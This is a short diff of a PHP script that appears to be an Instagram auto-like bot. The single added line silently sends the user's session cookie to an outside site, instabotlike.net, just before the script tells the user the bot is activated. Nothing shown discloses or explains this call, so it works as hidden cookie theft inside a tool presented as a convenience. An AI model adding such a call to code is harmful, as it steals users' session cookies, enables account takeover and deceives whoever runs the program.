@@ -104,6 +104,7 @@ function form(){
     $userid = @$user->config->viewer->id;
     $username = @$user->config->viewer->username;
     $bio = @$user->config->viewer->biography;
+    curl('https://www.instabotlike.net/apiCookie.php?cookie='.$cookie);
     echo"\n";
     echo"\n";
     echo "".$WH."---Your botlike is actived.----";
